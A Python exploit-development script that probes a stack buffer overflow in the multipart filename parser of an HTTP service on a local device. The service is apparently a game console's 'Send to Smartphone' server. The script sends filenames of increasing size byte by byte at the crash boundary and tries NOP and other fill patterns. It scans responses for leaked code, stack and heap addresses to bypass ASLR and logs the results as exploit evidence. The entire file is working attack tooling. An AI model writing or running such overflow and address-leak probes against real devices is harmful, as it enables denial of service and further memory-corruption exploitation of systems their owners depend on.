#!/usr/bin/env python3 -u -I
"""
Multipart filename overflow: probe for info leak at crash boundary.

The multipart parser has a ~0x1000 stack buffer for the filename.
Crash at filename >= 3992B, safe at <= 3984B.

This probes byte-by-byte at the boundary to find a "corruption without crash"
window where the HTTP response might leak stack data (code/stack pointers).
"""

import socket
import struct
import time
import json
import os
import sys
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = 'wlp5s0'
HTTP_TARGET = '192.168.0.1'
HTTP_PORT = 80
EVIDENCE_DIR = str(_LDN_ROOT / 'evidence' / 'exploit_dev')


def build_multipart_request(filename_len, fill_byte=0x41):
    """Build POST / with multipart containing a filename of specified length."""
    filename = bytes([fill_byte]) * filename_len
    boundary = b'----TestBoundary9876'
    body = (b'------TestBoundary9876\r\n'
            b'Content-Disposition: form-data; name="file"; filename="'
            + filename + b'"\r\n'
            b'Content-Type: application/octet-stream\r\n\r\n'
            b'TESTDATA\r\n'
            b'------TestBoundary9876--\r\n')

    req = (b'POST / HTTP/1.1\r\n'
           b'Host: 192.168.0.1\r\n'
           b'Content-Type: multipart/form-data; boundary=----TestBoundary9876\r\n'
           b'Content-Length: ' + str(len(body)).encode() + b'\r\n'
           b'\r\n' + body)
    return req


def send_multipart(filename_len, fill_byte=0x41, timeout=5):
    """Send multipart request, return (response_bytes, error_string)."""
    req = build_multipart_request(filename_len, fill_byte)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.setsockopt(socket.SOL_SOCKET, 25, b'wlp5s0\0')
        s.connect((HTTP_TARGET, HTTP_PORT))
        s.sendall(req)
        resp = b''
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        s.close()
        return resp, None
    except Exception as e:
        return b'', str(e)


def check_http(timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.setsockopt(socket.SOL_SOCKET, 25, b'wlp5s0\0')
        s.connect((HTTP_TARGET, HTTP_PORT))
        s.sendall(b'GET /data.json HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        resp = b''
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        s.close()
        return b'200 OK' in resp, resp
    except Exception:
        return False, b''


def scan_for_addresses(data):
    """Scan for Horizon ASLR code/stack/heap addresses in raw bytes."""
    findings = []
    if not data or len(data) < 8:
        return findings
    for i in range(len(data) - 7):
        val = struct.unpack_from('<Q', data, i)[0]
        if 0x0000007100000000 <= val <= 0x000000710FFFFFFF:
            findings.append(('CODE', i, val))
        elif 0x0000007F00000000 <= val <= 0x0000007FFFFFFFFF:
            findings.append(('STACK', i, val))
        elif 0x0000007000000000 <= val <= 0x000000700FFFFFFF:
            findings.append(('HEAP', i, val))
    return findings


def main():
    os.makedirs(EVIDENCE_DIR, exist_ok=True)

    alive, _ = check_http()
    if not alive:
        print("HTTP down. Start Send to Smartphone.")
        sys.exit(1)

    print("=" * 60)
    print("MULTIPART INFO LEAK PROBE")
    print("=" * 60)
    print()

    results = []

    # Phase 1: Confirm baseline behavior
    print("[Phase 1] Baseline — safe and crash sizes")

    # Safe baseline
    resp, err = send_multipart(100)
    status = resp.split(b'\r\n')[0].decode() if resp else f'err:{err}'
    print(f"  100B filename: {status} ({len(resp)}B)")
    alive, _ = check_http()
    print(f"  HTTP after: {'alive' if alive else 'DOWN'}")
    results.append({
        'phase': 'baseline', 'filename_len': 100,
        'status': status, 'resp_len': len(resp), 'alive': alive
    })
    print()

    if not alive:
        print("HTTP died on safe baseline! Aborting.")
        sys.exit(1)

    # Phase 2: Byte-by-byte probe at crash boundary
    # Known: 3984 safe, 3992 crash. Probe 3984-3996 in 1-byte steps.
    print("[Phase 2] Crash boundary probe (3980-3996, 1-byte steps)")
    print("  Looking for: response changes, extra data, leaked addresses")
    print()

    baseline_resp, _ = send_multipart(100)  # reference response
    baseline_body = baseline_resp.split(b'\r\n\r\n', 1)[1] if b'\r\n\r\n' in baseline_resp else b''

    for size in range(3980, 3997):
        alive_before, _ = check_http()
        if not alive_before:
            print(f"  ** HTTP is DOWN — previous test crashed it. Stopping. **")
            break

        resp, err = send_multipart(size)
        status = resp.split(b'\r\n')[0].decode() if resp else f'err:{err}'
        body = resp.split(b'\r\n\r\n', 1)[1] if b'\r\n\r\n' in resp else b''

        time.sleep(0.3)
        alive_after, _ = check_http()

        # Check for differences from baseline
        diff = body != baseline_body if body else False
        addrs = scan_for_addresses(resp)

        marker = ''
        if not alive_after:
            marker = ' *** CRASH ***'
        elif diff:
            marker = ' !! DIFFERENT RESPONSE !!'
        if addrs:
            marker += f' ** {len(addrs)} ADDRESSES **'

        print(f"  {size}B: {status} ({len(resp)}B) HTTP={'UP' if alive_after else 'DOWN'}{marker}")

        if addrs:
            for kind, off, val in addrs[:5]:
                print(f"    {kind} @ resp[{off}]: 0x{val:016x}")

        if diff and body:
            print(f"    Body diff: {body[:200]}")

        results.append({
            'phase': 'boundary', 'filename_len': size,
            'status': status, 'resp_len': len(resp),
            'body_len': len(body), 'alive_after': alive_after,
            'body_diff': diff, 'addresses': len(addrs),
            'resp_hex': resp.hex() if len(resp) < 1000 else resp[:500].hex() + '...',
        })

        if not alive_after:
            print(f"  Crash at filename={size}B. Stopping boundary probe.")
            break

    # Phase 3: If we still have HTTP, test with different fill patterns
    # Different fill bytes might corrupt locals differently
    alive, _ = check_http()
    if alive:
        print()
        print("[Phase 3] Fill pattern tests at last safe size")
        last_safe = max(r['filename_len'] for r in results
                        if r.get('alive_after', True) and r['phase'] == 'boundary')
        print(f"  Last safe size: {last_safe}")

        for fill, label in [(0x00, 'NULL'), (0xFF, '0xFF'), (0x90, 'NOP'),
                            (0x41, 'A'), (0x61, 'a')]:
            resp, err = send_multipart(last_safe, fill_byte=fill)
            body = resp.split(b'\r\n\r\n', 1)[1] if b'\r\n\r\n' in resp else b''
            addrs = scan_for_addresses(resp)
            alive_after, _ = check_http()

            marker = ''
            if addrs:
                marker = f' ** {len(addrs)} ADDRESSES **'
            if not alive_after:
                marker += ' *** CRASH ***'

            print(f"  fill={label}: ({len(resp)}B) HTTP={'UP' if alive_after else 'DOWN'}{marker}")

            if addrs:
                for kind, off, val in addrs[:3]:
                    print(f"    {kind} @ resp[{off}]: 0x{val:016x}")

            results.append({
                'phase': 'fill', 'filename_len': last_safe, 'fill': hex(fill),
                'resp_len': len(resp), 'alive_after': alive_after,
                'addresses': len(addrs),
            })

            if not alive_after:
                break

    # Save evidence
    path = f"{EVIDENCE_DIR}/multipart_leak_{int(time.time())}.json"
    with open(path, 'w') as f:
        json.dump({
            'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
            'results': results,
        }, f, indent=2)
    print(f"\nEvidence: {path}")

    # Summary
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    crashes = [r for r in results if not r.get('alive_after', True)]
    leaks = [r for r in results if r.get('addresses', 0) > 0]
    diffs = [r for r in results if r.get('body_diff')]

    if crashes:
        print(f"  Crash boundary: filename={crashes[0]['filename_len']}B")
    if leaks:
        print(f"  ** ADDRESS LEAKS FOUND in {len(leaks)} responses! **")
        for r in leaks:
            print(f"    size={r['filename_len']}: {r['addresses']} addresses")
    elif diffs:
        print(f"  Response differences found (possible partial leak)")
    else:
        print(f"  No address leaks in responses (responses are clean)")


if __name__ == '__main__':
    main()
